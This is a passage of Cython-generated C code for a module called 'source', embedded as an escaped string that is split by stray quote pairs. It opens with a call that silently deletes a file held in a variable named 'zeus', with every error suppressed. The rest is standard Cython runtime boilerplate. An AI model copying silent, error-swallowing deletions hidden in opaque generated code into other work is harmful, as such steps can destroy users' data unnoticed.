__Pyx_GetModuleGloba""lName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L59_error)\\n              __Pyx_GOTREF(__pyx_t_2);\\n              __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_remove); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 27, __pyx_L59_error)\\n              __Pyx_GOTREF(__pyx_t_11);\\n              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n              __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_zeus); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L59_error)\\n              __Pyx_GOTREF(__pyx_t_2);\\n              __pyx_t_15 = __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 27, __pyx_L59_error)\\n              __Pyx_GOTREF(__pyx_t_15);\\n              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\\n              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\\n              __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n\\n\\n            }\\n\\n\\n          }\\n          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\\n          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\\n          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\\n          goto __pyx_L64_try_end;\\n          __pyx_L59_error:;\\n          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\\n          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\\n          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\\n          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\\n          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;\\n\\n\\n          __pyx_t_22 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);\\n          if (__pyx_t_22) {\\n            __Pyx_ErrRestore(0,0,0);\\n            goto __pyx_L60_exception_handled;\\n   \"\"       }\\n          goto __pyx_L61_except_error;\\n          __pyx_L61_except_error:;\\n\\n\\n          __Pyx_XGIVEREF(__pyx_t_9);\\n          __Pyx_XGIVEREF(__pyx_t_8);\\n          __Pyx_XGIVEREF(__pyx_t_7);\\n          __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);\\n          goto __pyx_L58_error;\\n          __pyx_L60_exception_han""dled:;\\n          __Pyx_XGIVEREF(__pyx_t_9);\\n          __Pyx_XGIVEREF(__pyx_t_8);\\n          __Pyx_XGIVEREF(__pyx_t_7);\\n          __Pyx_ExceptionReset(__pyx_t_9, __pyx_t_8, __pyx_t_7);\\n          __pyx_L64_try_end:;\\n        }\\n      }\\n      if (PY_MAJOR_VERSION >= 3) {\\n        __Pyx_XGIVEREF(__pyx_t_20);\\n        __Pyx_XGIVEREF(__pyx_t_12);\\n        __Pyx_XGIVEREF(__pyx_t_10);\\n        __Pyx_ExceptionReset(__pyx_t_20, __pyx_t_12, __pyx_t_10);\\n      }\\n      __Pyx_XGIVEREF(__pyx_t_3);\\n      __Pyx_XGIVEREF(__pyx_t_4);\\n      __Pyx_XGIVEREF(__pyx_t_5);\\n      __Pyx_ErrRestore(__pyx_t_3, __pyx_t_4, __pyx_t_5);\\n      __pyx_t_3 = 0; __pyx_t_4 = 0; __pyx_t_5 = 0; __pyx_t_20 = 0; __pyx_t_12 = 0; __pyx_t_10 = 0;\\n      __pyx_lineno = __pyx_t_18; __pyx_clineno = __pyx_t_17; __pyx_filename = __pyx_t_21;\\n      goto __pyx_L1_error;\\n      __pyx_L58_error:;\\n      if (PY_MAJOR_VERSION >= 3) {\\n        __Pyx_XGIVEREF(__pyx_t_20);\\n        __Pyx_XGIVEREF(__pyx_t_12);\\n        __Pyx_XGIVEREF(__pyx_t_10);\\n        __Pyx_ExceptionReset(__pyx_t_20, __pyx_t_12, __pyx_t_10);\\n      }\\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\\n      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\\n      __pyx_t_20 = 0; __pyx_t_12 = 0; __pyx_t_10 = 0;\\n      goto __pyx_L1_error;\\n    }\\n    __pyx_L4:;\\n  }\\n\\n\\n  __pyx_t_15 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_GOTREF(__pyx_t_15);\\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_15) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\\n  __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\\n\\n  /*--- Wrapped vars code ---*/\\n\\n  got\"\"o __pyx_L0;\\n  __pyx_L1_error:;\\n  __Pyx_XDECREF(__pyx_t_1);\\n  __Pyx_XDECREF(__pyx_t_2);\\n  __Pyx_XDECREF(__pyx_t_6);\\n  __Pyx_XDECREF(__pyx_t_11);\\n  __Pyx_XDECREF(__pyx_t_15);\\n  if (__pyx_m) {\\n    if (__pyx_d) {\\n      __Pyx_AddTraceback(\\\"init source\\\", __pyx_clineno,"" __pyx_lineno, __pyx_filename);\\n    }\\n    Py_CLEAR(__pyx_m);\\n  } else if (!PyErr_Occurred()) {\\n    PyErr_SetString(PyExc_ImportError, \\\"init source\\\");\\n  }\\n  __pyx_L0:;\\n  __Pyx_RefNannyFinishContext();\\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\\n  return (__pyx_m != NULL) ? 0 : -1;\\n  #elif PY_MAJOR_VERSION >= 3\\n  return __pyx_m;\\n  #else\\n  return;\\n  #endif\\n}\\n\\n/* --- Runtime support code --- */\\n/* Refnanny */\\n#if CYTHON_REFNANNY\\nstatic __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {\\n    PyObject *m = NULL, *p = NULL;\\n    void *r = NULL;\\n    m = PyImport_ImportModule(modname);\\n    if (!m) goto end;\\n    p = PyObject_GetAttrString(m, \\\"RefNannyAPI\\\");\\n    if (!p) goto end;\\n    r = PyLong_AsVoidPtr(p);\\nend:\\n    Py_XDECREF(p);\\n    Py_XDECREF(m);\\n    return (__Pyx_RefNannyAPIStruct *)r;\\n}\\n#endif\\n\\n/* PyObjectGetAttrStr */\\n#if CYTHON_USE_TYPE_SLOTS\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {\\n    PyTypeObject* tp = Py_TYPE(obj);\\n    if (likely(tp->tp_getattro))\\n        return tp->tp_getattro(obj, attr_name);\\n#if PY_MAJOR_VERSION < 3\\n    if (likely(tp->tp_getattr))\\n        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));\\n#endif\\n    return PyObject_GetAttr(obj, attr_name);\\n}\\n#endif\\n\\n/* GetBuiltinName */\\nstatic PyObject *__Pyx_GetBuiltinName(PyObject *name) {\\n    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);\\n    if (unlikely(!result)) {\\n        PyErr_Format(PyExc_NameError,\\n#if PY_MAJOR_VERSION >= 3\\n            \\\"name '%U' is not defined\\\", name);\\n#else\\n            \\\"name '%.200s' is not defined\\\", PyString_AS_STRING(name));\\n#endif\\n    }\\n    return result;\\n}\"\"\\n\\n/* Import */\\nstatic PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {\\n    PyObject *empty_list = 0;\\n    PyObject *module = 0;\\n    PyObject *global_dict = 0;""\\n    PyObject *empty_dict = 0;\\n    PyObject *list;\\n    #if PY_MAJOR_VERSION < 3\\n    PyObject *py_import;\\n    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);\\n    if (!py_import)\\n        goto bad;\\n    #endif\\n    if (from_list)\\n        list = from_list;\\n    else {\\n        empty_list = PyList_New(0);\\n        if (!empty_list)\\n            goto bad;\\n        list = empty_list;\\n    }\\n    global_dict = PyModule_GetDict(__pyx_m);\\n    if (!global_dict)\\n        goto bad;\\n    empty_dict = PyDict_New();\\n    if (!empty_dict)\\n        goto bad;\\n    {\\n        #if PY_MAJOR_VERSION >= 3\\n        if (level == -1) {\\n            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {\\n                module = PyImport_ImportModuleLevelObject(\\n                    name, global_dict, empty_dict, list, 1);\\n                if (!module) {\\n                    if (!PyErr_ExceptionMatches(PyExc_ImportError))\\n                        goto bad;\\n                    PyErr_Clear();\\n                }\\n            }\\n            level = 0;\\n        }\\n        #endif\\n        if (!module) {\\n            #if PY_MAJOR_VERSION < 3\\n            PyObject *py_level = PyInt_FromLong(level);\\n            if (!py_level)\\n                goto bad;\\n            module = PyObject_CallFunctionObjArgs(py_import,\\n                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);\\n            Py_DECREF(py_level);\\n            #else\\n            module = PyImport_ImportModuleLevelObject(\\n                name, global_dict, empty_dict, list, level);\\n            #endif\\n        }\\n    }\\nbad:\\n    #if PY_MAJOR_VERSION < 3\\n    Py_XDECREF(py_import);\\n    #endif\\n    Py_XDECREF(empty_list);\\n    Py_XDECREF(empty_dict);\\n    return module;\\n}\\n\\n/* decode_c_bytes */\\nstatic CYTHON_INLINE \"\"PyObject* __Pyx_decode_c_bytes(\\n         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,""\\n         const char* encoding, const char* errors,\\n         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {\\n    if (unlikely((start < 0) | (stop < 0))) {\\n        if (start < 0) {\\n            start += length;\\n            if (start < 0)\\n                start = 0;\\n        }\\n        if (stop < 0)\\n            stop += length;\\n    }\\n    if (stop > length)\\n        stop = length;\\n    if (unlikely(stop <= start))\\n        return __Pyx_NewRef(__pyx_empty_unicode);\\n    length = stop - start;\\n    cstring += start;\\n    if (decode_func) {\\n        return decode_func(cstring, length, errors);\\n    } else {\\n        return PyUnicode_Decode(cstring, length, encoding, errors);\\n    }\\n}\\n\\n/* PyCFunctionFastCall */\\n#if CYTHON_FAST_PYCCALL\\nstatic CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {\\n    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;\\n    PyCFunction meth = PyCFunction_GET_FUNCTION(func);\\n    PyObject *self = PyCFunction_GET_SELF(func);\\n    int flags = PyCFunction_GET_FLAGS(func);\\n    assert(PyCFunction_Check(func));\\n    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));\\n    assert(nargs >= 0);\\n    assert(nargs == 0 || args != NULL);\\n    /* _PyCFunction_FastCallDict() must not be called with an exception set,\\n       because it may clear it (directly or indirectly) and so the\\n       caller loses its exception */\\n    assert(!PyErr_Occurred());\\n    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {\\n        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);\\n    } else {\\n        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);\\n    }\\n}\\n#endif\\n\\n/* PyFunctionFastCall */\\n#if CYTHON_FAST_PYCALL\"\"\\nstatic PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co,"" PyObject **args, Py_ssize_t na,\\n                                               PyObject *globals) {\\n    PyFrameObject *f;\\n    PyThreadState *tstate = __Pyx_PyThreadState_Current;\\n    PyObject **fastlocals;\\n    Py_ssize_t i;\\n    PyObject *result;\\n    assert(globals != NULL);\\n    /* XXX Perhaps we should create a specialized\\n       PyFrame_New() that doesn't take locals, but does\\n       take builtins without sanity checking them.\\n       */\\n    assert(tstate != NULL);\\n    f = PyFrame_New(tstate, co, globals, NULL);\\n    if (f == NULL) {\\n        return NULL;\\n    }\\n    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);\\n    for (i = 0; i < na; i++) {\\n        Py_INCREF(*args);\\n        fastlocals[i] = *args++;\\n    }\\n    result = PyEval_EvalFrameEx(f,0);\\n    ++tstate->recursion_depth;\\n    Py_DECREF(f);\\n    --tstate->recursion_depth;\\n    return result;\\n}\\n#if 1 || PY_VERSION_HEX < 0x030600B1\\nstatic PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {\\n    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);\\n    PyObject *globals = PyFunction_GET_GLOBALS(func);\\n    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);\\n    PyObject *closure;\\n#if PY_MAJOR_VERSION >= 3\\n    PyObject *kwdefs;\\n#endif\\n    PyObject *kwtuple, **k;\\n    PyObject **d;\\n    Py_ssize_t nd;\\n    Py_ssize_t nk;\\n    PyObject *result;\\n    assert(kwargs == NULL || PyDict_Check(kwargs));\\n    nk = kwargs ? PyDict_Size(kwargs) : 0;\\n    if (Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")) {\\n        return NULL;\\n    }\\n    if (\\n#if PY_MAJOR_VERSION >= 3\\n            co->co_kwonlyargcount == 0 &&\\n#endif\\n            likely(kwargs == NULL || nk == 0) &&\\n            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {\\n        if (argdefs == NULL && co->co_argcount == nargs) {\\n            result = __Pyx_PyFunction_FastCallNoKw(c\"\"o, a""rgs, nargs, globals);\\n            goto done;\\n        }\\n        else if (nargs == 0 && argdefs != NULL\\n                 && co->co_argcount == Py_SIZE(argdefs)) {\\n            /* function called with no arguments, but all parameters have\\n               a default value: use default values as arguments .*/\\n            args = &PyTuple_GET_ITEM(argdefs, 0);\\n            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);\\n            goto done;\\n        }\\n    }\\n    if (kwargs != NULL) {\\n        Py_ssize_t pos, i;\\n        kwtuple = PyTuple_New(2 * nk);\\n        if (kwtuple == NULL) {\\n            result = NULL;\\n            goto done;\\n        }\\n        k = &PyTuple_GET_ITEM(kwtuple, 0);\\n        pos = i = 0;\\n        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {\\n            Py_INCREF(k[i]);\\n            Py_INCREF(k[i+1]);\\n            i += 2;\\n        }\\n        nk = i / 2;\\n    }\\n    else {\\n        kwtuple = NULL;\\n        k = NULL;\\n    }\\n    closure = PyFunction_GET_CLOSURE(func);\\n#if PY_MAJOR_VERSION >= 3\\n    kwdefs = PyFunction_GET_KW_DEFAULTS(func);\\n#endif\\n    if (argdefs != NULL) {\\n        d = &PyTuple_GET_ITEM(argdefs, 0);\\n        nd = Py_SIZE(argdefs);\\n    }\\n    else {\\n        d = NULL;\\n        nd = 0;\\n    }\\n#if PY_MAJOR_VERSION >= 3\\n    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,\\n                               args, (int)nargs,\\n                               k, (int)nk,\\n                               d, (int)nd, kwdefs, closure);\\n#else\\n    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,\\n                               args, (int)nargs,\\n                               k, (int)nk,\\n                               d, (int)nd, closure);\\n#endif\\n    Py_XDECREF(kwtuple);\\ndone:\\n    Py_LeaveRecursiveCall();\\n    return result;\\n}\\n#endif\\n#endif\\n\\n/* PyObjectCall */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic ""CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, P\"\"yObject *arg, PyObject *kw) {\\n    PyObject *result;\\n    ternaryfunc call = Py_TYPE(func)->tp_call;\\n    if (unlikely(!call))\\n        return PyObject_Call(func, arg, kw);\\n    if (unlikely(Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")))\\n        return NULL;\\n    result = (*call)(func, arg, kw);\\n    Py_LeaveRecursiveCall();\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\n        PyErr_SetString(\\n            PyExc_SystemError,\\n            \\\"NULL result without error in PyObject_Call\\\");\\n    }\\n    return result;\\n}\\n#endif\\n\\n/* PyObjectCallMethO */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {\\n    PyObject *self, *result;\\n    PyCFunction cfunc;\\n    cfunc = PyCFunction_GET_FUNCTION(func);\\n    self = PyCFunction_GET_SELF(func);\\n    if (unlikely(Py_EnterRecursiveCall((char*)\\\" while calling a Python object\\\")))\\n        return NULL;\\n    result = cfunc(self, arg);\\n    Py_LeaveRecursiveCall();\\n    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {\\n        PyErr_SetString(\\n            PyExc_SystemError,\\n            \\\"NULL result without error in PyObject_Call\\\");\\n    }\\n    return result;\\n}\\n#endif\\n\\n/* PyObjectCallOneArg */\\n#if CYTHON_COMPILING_IN_CPYTHON\\nstatic PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n    PyObject *result;\\n    PyObject *args = PyTuple_New(1);\\n    if (unlikely(!args)) return NULL;\\n    Py_INCREF(arg);\\n    PyTuple_SET_ITEM(args, 0, arg);\\n    result = __Pyx_PyObject_Call(func, args, NULL);\\n    Py_DECREF(args);\\n    return result;\\n}\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n#if CYTHON_FAST_PYCALL\\n    if (PyFunction_Check(func)) {\\n        return __Pyx_PyFunction_FastCall(func, &arg, 1);\\n    }\\n#endif""\\n    if (likely(PyCFunction_Check(func))) {\\n        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {\\n            return __Pyx_PyObjec\"\"t_CallMethO(func, arg);\\n#if CYTHON_FAST_PYCCALL\\n        } else if (__Pyx_PyFastCFunction_Check(func)) {\\n            return __Pyx_PyCFunction_FastCall(func, &arg, 1);\\n#endif\\n        }\\n    }\\n    return __Pyx__PyObject_CallOneArg(func, arg);\\n}\\n#else\\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\\n    PyObject *result;\\n    PyObject *args = PyTuple_Pack(1, arg);\\n    if (unlikely(!args)) return NULL;\\n    result = __Pyx_PyObject_Call(func, args, NULL);\\n    Py_DECREF(args);\\n    return result;\\n}\\n#endif\\n\\n/* FetchCommonType */\\nstatic PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type) {\\n    PyObject* fake_module;\\n    PyTypeObject* cached_type = NULL;\\n    fake_module = PyImport_AddModule((char*) \\\"_cython_\\\" CYTHON_ABI);\\n    if (!fake_module) return NULL;\\n    Py_INCREF(fake_module);\\n    cached_type = (PyTypeObject*) PyObject_GetAttrString(fake_module, type->tp_name);\\n    if (cached_type) {\\n        if (!PyType_Check((PyObject*)cached_type)) {\\n            PyErr_Format(PyExc_TypeError,\\n                \\\"Shared Cython type %.200s is not a type object\\\",\\n                type->tp_name);\\n            goto bad;\\n        }\\n        if (cached_type->tp_basicsize != type->tp_basicsize) {\\n            PyErr_Format(PyExc_TypeError,\\n                \\\"Shared Cython type %.200s has the wrong size, try recompiling\\\",\\n                type->tp_name);\\n            goto bad;\\n        }\\n    } else {\\n        if (!PyErr_ExceptionMatches(PyExc_AttributeError)) goto bad;\\n        PyErr_Clear();\\n        if (PyType_Ready(type) < 0) goto bad;\\n        if (PyObject_SetAttrString(fake_module, type->tp_name, (PyObject*) type) < 0)\\n            goto bad;\\n        Py_INCREF(type);\\n        cached_type = type;\\n    }\\ndone:""\\n    Py_DECREF(fake_module);\\n    return cached_type;\\nbad:\\n    Py_XDECREF(cached_type);\\n    cached_type = NULL;\\n    goto done;\\n}\\n\\n/* CythonFunctionShared */\\n#include <structmember.h>\\nstatic PyObject *\"\"\\n__Pyx_CyFunction_get_doc(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *closure)\\n{\\n    if (unlikely(op->func_doc == NULL)) {\\n        if (op->func.m_ml->ml_doc) {\\n#if PY_MAJOR_VERSION >= 3\\n            op->func_doc = PyUnicode_FromString(op->func.m_ml->ml_doc);\\n#else\\n            op->func_doc = PyString_FromString(op->func.m_ml->ml_doc);\\n#endif\\n            if (unlikely(op->func_doc == NULL))\\n                return NULL;\\n        } else {\\n            Py_INCREF(Py_None);\\n            return Py_None;\\n        }\\n    }\\n    Py_INCREF(op->func_doc);\\n    return op->func_doc;\\n}\\nstatic int\\n__Pyx_CyFunction_set_doc(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)\\n{\\n    PyObject *tmp = op->func_doc;\\n    if (value == NULL) {\\n        value = Py_None;\\n    }\\n    Py_INCREF(value);\\n    op->func_doc = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_name(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)\\n{\\n    if (unlikely(op->func_name == NULL)) {\\n#if PY_MAJOR_VERSION >= 3\\n        op->func_name = PyUnicode_InternFromString(op->func.m_ml->ml_name);\\n#else\\n        op->func_name = PyString_InternFromString(op->func.m_ml->ml_name);\\n#endif\\n        if (unlikely(op->func_name == NULL))\\n            return NULL;\\n    }\\n    Py_INCREF(op->func_name);\\n    return op->func_name;\\n}\\nstatic int\\n__Pyx_CyFunction_set_name(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)\\n{\\n    PyObject *tmp;\\n#if PY_MAJOR_VERSION >= 3\\n    if (unlikely(value == NULL || !PyUnicode_Check(value)))\\n#else\\n    if (unlikely(value == NULL || !PyString_Check(value)))\\n#endif\\n    {\\n        PyErr_SetString(PyExc_TypeEr""ror,\\n                        \\\"__name__ must be set to a string object\\\");\\n        return -1;\\n    }\\n    tmp = op->func_name;\\n    Py_INCREF(value);\\n    op->func_name = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_qualname(__pyx_CyFunc\"\"tionObject *op, CYTHON_UNUSED void *context)\\n{\\n    Py_INCREF(op->func_qualname);\\n    return op->func_qualname;\\n}\\nstatic int\\n__Pyx_CyFunction_set_qualname(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)\\n{\\n    PyObject *tmp;\\n#if PY_MAJOR_VERSION >= 3\\n    if (unlikely(value == NULL || !PyUnicode_Check(value)))\\n#else\\n    if (unlikely(value == NULL || !PyString_Check(value)))\\n#endif\\n    {\\n        PyErr_SetString(PyExc_TypeError,\\n                        \\\"__qualname__ must be set to a string object\\\");\\n        return -1;\\n    }\\n    tmp = op->func_qualname;\\n    Py_INCREF(value);\\n    op->func_qualname = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_self(__pyx_CyFunctionObject *m, CYTHON_UNUSED void *closure)\\n{\\n    PyObject *self;\\n    self = m->func_closure;\\n    if (self == NULL)\\n        self = Py_None;\\n    Py_INCREF(self);\\n    return self;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_dict(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)\\n{\\n    if (unlikely(op->func_dict == NULL)) {\\n        op->func_dict = PyDict_New();\\n        if (unlikely(op->func_dict == NULL))\\n            return NULL;\\n    }\\n    Py_INCREF(op->func_dict);\\n    return op->func_dict;\\n}\\nstatic int\\n__Pyx_CyFunction_set_dict(__pyx_CyFunctionObject *op, PyObject *value, CYTHON_UNUSED void *context)\\n{\\n    PyObject *tmp;\\n    if (unlikely(value == NULL)) {\\n        PyErr_SetString(PyExc_TypeError,\\n               \\\"function's dictionary may not be deleted\\\");\\n        return -1;\\n    }\\n    if (unlikely(!PyDict_Check(value))) {\\n        PyErr_Se""tString(PyExc_TypeError,\\n               \\\"setting function's dictionary to a non-dict\\\");\\n        return -1;\\n    }\\n    tmp = op->func_dict;\\n    Py_INCREF(value);\\n    op->func_dict = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_globals(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)\\n{\\n    Py_INCREF(op->fu\"\"nc_globals);\\n    return op->func_globals;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_closure(CYTHON_UNUSED __pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)\\n{\\n    Py_INCREF(Py_None);\\n    return Py_None;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_code(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context)\\n{\\n    PyObject* result = (op->func_code) ? op->func_code : Py_None;\\n    Py_INCREF(result);\\n    return result;\\n}\\nstatic int\\n__Pyx_CyFunction_init_defaults(__pyx_CyFunctionObject *op) {\\n    int result = 0;\\n    PyObject *res = op->defaults_getter((PyObject *) op);\\n    if (unlikely(!res))\\n        return -1;\\n    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\\n    op->defaults_tuple = PyTuple_GET_ITEM(res, 0);\\n    Py_INCREF(op->defaults_tuple);\\n    op->defaults_kwdict = PyTuple_GET_ITEM(res, 1);\\n    Py_INCREF(op->defaults_kwdict);\\n    #else\\n    op->defaults_tuple = PySequence_ITEM(res, 0);\\n    if (unlikely(!op->defaults_tuple)) result = -1;\\n    else {\\n        op->defaults_kwdict = PySequence_ITEM(res, 1);\\n        if (unlikely(!op->defaults_kwdict)) result = -1;\\n    }\\n    #endif\\n    Py_DECREF(res);\\n    return result;\\n}\\nstatic int\\n__Pyx_CyFunction_set_defaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {\\n    PyObject* tmp;\\n    if (!value) {\\n        value = Py_None;\\n    } else if (value != Py_None && !PyTuple_Check(value)) {\\n        PyErr_SetString(PyExc_TypeError,\\n                        \\\"__defaults__ must be set to a tuple object\\\");\\n        return -1"";\\n    }\\n    Py_INCREF(value);\\n    tmp = op->defaults_tuple;\\n    op->defaults_tuple = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_defaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {\\n    PyObject* result = op->defaults_tuple;\\n    if (unlikely(!result)) {\\n        if (op->defaults_getter) {\\n            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;\\n          \"\"  result = op->defaults_tuple;\\n        } else {\\n            result = Py_None;\\n        }\\n    }\\n    Py_INCREF(result);\\n    return result;\\n}\\nstatic int\\n__Pyx_CyFunction_set_kwdefaults(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {\\n    PyObject* tmp;\\n    if (!value) {\\n        value = Py_None;\\n    } else if (value != Py_None && !PyDict_Check(value)) {\\n        PyErr_SetString(PyExc_TypeError,\\n                        \\\"__kwdefaults__ must be set to a dict object\\\");\\n        return -1;\\n    }\\n    Py_INCREF(value);\\n    tmp = op->defaults_kwdict;\\n    op->defaults_kwdict = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_kwdefaults(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {\\n    PyObject* result = op->defaults_kwdict;\\n    if (unlikely(!result)) {\\n        if (op->defaults_getter) {\\n            if (__Pyx_CyFunction_init_defaults(op) < 0) return NULL;\\n            result = op->defaults_kwdict;\\n        } else {\\n            result = Py_None;\\n        }\\n    }\\n    Py_INCREF(result);\\n    return result;\\n}\\nstatic int\\n__Pyx_CyFunction_set_annotations(__pyx_CyFunctionObject *op, PyObject* value, CYTHON_UNUSED void *context) {\\n    PyObject* tmp;\\n    if (!value || value == Py_None) {\\n        value = NULL;\\n    } else if (!PyDict_Check(value)) {\\n        PyErr_SetString(PyExc_TypeError,\\n                        \\\"__annotations__ must be set to a dict object\\\");\\n        return -""1;\\n    }\\n    Py_XINCREF(value);\\n    tmp = op->func_annotations;\\n    op->func_annotations = value;\\n    Py_XDECREF(tmp);\\n    return 0;\\n}\\nstatic PyObject *\\n__Pyx_CyFunction_get_annotations(__pyx_CyFunctionObject *op, CYTHON_UNUSED void *context) {\\n    PyObject* result = op->func_annotations;\\n    if (unlikely(!result)) {\\n        result = PyDict_New();\\n        if (unlikely(!result)) return NULL;\\n        op->func_annotations = result;\\n    }\\n    Py_INCREF(result);\\n    return result;\\n}\\nstatic\"\" PyGetSetDef __pyx_CyFunction_getsets[] = {\\n    {(char *) \\\"func_doc\\\", (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\\n    {(char *) \\\"__doc__\\\",  (getter)__Pyx_CyFunction_get_doc, (setter)__Pyx_CyFunction_set_doc, 0, 0},\\n    {(char *) \\\"func_name\\\", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\\n    {(char *) \\\"__name__\\\", (getter)__Pyx_CyFunction_get_name, (setter)__Pyx_CyFunction_set_name, 0, 0},\\n    {(char *) \\\"__qualname__\\\", (getter)__Pyx_CyFunction_get_qualname, (setter)__Pyx_CyFunction_set_qualname, 0, 0},\\n    {(char *) \\\"__self__\\\", (getter)__Pyx_CyFunction_get_self, 0, 0, 0},\\n    {(char *) \\\"func_dict\\\", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\\n    {(char *) \\\"__dict__\\\", (getter)__Pyx_CyFunction_get_dict, (setter)__Pyx_CyFunction_set_dict, 0, 0},\\n    